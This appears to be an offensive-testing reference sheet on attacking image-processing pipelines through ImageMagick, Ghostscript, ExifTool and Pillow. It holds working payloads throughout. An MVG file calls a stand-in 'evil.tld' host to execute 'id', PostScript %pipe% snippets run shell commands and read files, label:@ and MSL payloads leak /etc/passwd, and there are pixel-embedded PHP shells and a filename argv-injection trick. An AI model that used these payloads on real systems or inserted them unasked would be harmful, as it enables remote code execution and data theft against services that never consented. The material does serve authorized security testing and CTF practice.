# Image Attacks — ImageMagick, Ghostscript, EXIF, pixel survival

## The processor is the attack surface

Image uploads get *processed* — resized, thumbnailed, converted, stripped.
The processor is usually ImageMagick (`convert`, `magick`, PHP Imagick,
Node `sharp`/`gm`, Python PIL+delegates) or Ghostscript (PDF/PS/EPS
rendering). These delegate to format coders that shell out — the classic
RCE surface.

## ImageTragick family — MVG/MSL coders

`identify -list coder | grep -i mvg` or delegate map tells what's enabled.
ImageMagick's MVG (Magick Vector Graphics) coder interprets `image`/`ephemeral`
primitives that fetch URLs — `url()`/`label:@/file`/`image over`:

```mvg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://evil.tld/x.jpg|id > /tmp/o'
pop graphic-context
```

```mvg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

Payload in an `.mvg` file or inside an SVG's `xlink:href` processed by MVG.
Detect: upload an MVG/SVG, check whether `convert`/`identify` runs on it —
an error mentioning `delegate`/`mvg`/`coder` confirms the pipeline.

### MSL — `msl:` coder runs scripts

`.msl` files are XML "Magick Scripting Language" — `<image>` ops that read,
write, execute. If `msl:` is enabled and an `.msl` upload is processed:
`<read filename="/etc/passwd"/>` + `<write filename="caption:-"/>` leaks it
via the rendered output/error.

## Ghostscript — PDF/PS/EPS RCE

Ghostscript (`gs`) interprets PostScript — `.ps`/`.eps`/`.pdf` uploads that
get rendered (PDF preview, thumbnail, `convert x.pdf`).

Pre-SAFER-bypass shape (Ghostscript <9.50 era, and CTF emulations):

```postscript
%!PS
(%pipe%id) (r) file =    % pipe exec
/currentdevice get /OutputFile get =print
```

The `-dSAFER` sandbox historically broke file/pipe ops via `restore`/`put`
dictionary tricks (CVE-2019-6116, -2018-16509, -2023-36664 pipes inside
`%pipe%` names). Detection: upload a `.ps`/`.pdf` with a `/ID`-leaking or
`%pipe%` payload and watch for output in the thumbnail, error text, or a
callback (`oob_listener`) when the pipeline shells out.

Modern gs still runs `%pipe%` when `-dNOSAFER` or permissive `-dSAFER` —
try:

```postscript
%!PS-Adobe-3.0
/flag (%pipe%cat /flag) (r) file def
/buf 1024 string def flag buf readline pop = flush
```

The output lands in gs stdout — usually invisible; instead write out:

```postscript
/pf (/tmp/w.txt) (w) file def
flag buf readline pop pf exch writestring pf closefile
```

Then read `/tmp/w.txt` via whatever read primitive exists — or `image` it
into the output doc. For CTF with a URL fetch back: Ghostscript `.fetch`
/`(%pipe%curl ...)` exfil.

## EXIF/metadata — the inert-but-read channel

- `exiftool -Comment='<?php ...' img.jpg` — exec only via include/exec-path
- `-UserComment`, `-ImageDescription`, `-Artist`, `-Copyright`, `-XPComment`
- **ExifTool CVE-2021-22204** — DjVu `eval` injection inside EXIF: metadata
  parsed by vulnerable ExifTool versions evaluates `eval` code — a real
  RCE when the pipeline calls `exiftool`
- IPTC/XMP fields survive some pipelines; check the served file back with
  `exiftool served.jpg` to see which fields persist

## PIL/Pillow — delegates and format bugs

PIL itself doesn't shell out, but:

- `Image.open` on `.eps` delegates to **Ghostscript**
- format coders have had OOB/DoS CVEs — a crash in the thumbnail worker is
  a DoS signal, sometimes more
- `PIL.ImageMath`/`eval`-adjacent features — the amidst-us chain used
  `imagemath eval` in a *route*, not upload; check for eval-style image
  params in the API (`framework-sinks.md`)

## Re-encode survival — when only pixels persist

The pipeline `decode → resize → re-encode` strips all non-pixel bytes.
Payload that must survive lives **in the decoded pixel values**:

- **PNG non-resizing convert**: `imagecreatefrompng`+`imagepng` keeps exact
  pixels — craft an IDAT whose zlib-inflated bytes ARE the payload. The
  classic technique generates a PNG where decompressed scanlines spell the
  shell; GD writes the same bytes → `<?php ...` appears in the output
  IDAT region; PHP include on it executes. Requires the pipeline to keep
  same dimensions and not add filters — verify by diffing fetch-back bytes.
- **JPEG**: lossy — payload in DCT coefficients needs the published
  generator; treats as last resort.
- **Resize destroys pixel exactness** — if the app resizes, the payload
  must survive *interpolation* — practical payloads are basically nil;
  pivot to ImageMagick-coder or Ghostscript angles instead.

Verify survival empirically: upload `payload.png` → fetch served copy →
`strings served.png | grep` for the marker. No marker = stripped.

## Delegates and file reads — the leak channels

- `label:@/etc/passwd` — MVG label reads local file into the rendered image
- `ephemeral:`/`inline:` pseudo-protocols in `xlink:href`
- `cap:`/`cid:` delegate handlers
- ImageMagick `read` on `msl:`/`text:`/`txt:` coders
- `image.png[0]` / `image.png--100x100` geometry/source tricks in filenames
  passed to `convert` — if the FILENAME reaches a `convert` arg, option
  injection: `x.png -write /tmp/out` or `x.png | cmd` — filename→argv
  injection (`htb-magicom` chain shape: argv injection via crafted name)

## SVG → these attacks

SVG is XML but ImageMagick delegates it to MVG or rsvg/inkscape —
`svg-attacks.md` for XSS/XXE; for the *coder* angle, an SVG with
`<image xlink:href="https://evil|id">` hits the MVG delegate path on old
ImageMagick.

## Probe sequence

```
1. identify the processor: upload PNG → is a thumbnail generated?
   error text naming convert/gs/PIL/exiftool?
2. upload MVG canary → error reveals coder presence
3. upload .ps/.eps/.pdf → does a renderer run? error text?
4. upload exif-marked jpg → which metadata survives on fetch-back?
5. filename-as-argv: upload named "x.png -write /tmp/o.png" (if name
   interpolates into a convert command)
6. re-encode diff: does served image equal sent bytes?
```

## Falsifiers

- no image processing happens (store-and-serve only) → `detection.md` pivot
- the processor is PIL-only, no delegates reachable, and re-encode strips
  everything controllable
- `convert` runs with `-auto-orient` only and coders MVG/MSL/PS disabled,
  and filename never reaches argv

## Output to record

- the processor identified + version-ish signal (error text, coder list)
- which attack family it opened (mvg/msl/gs/exif/argv/pixel)
- the verbatim output or callback proving the reach
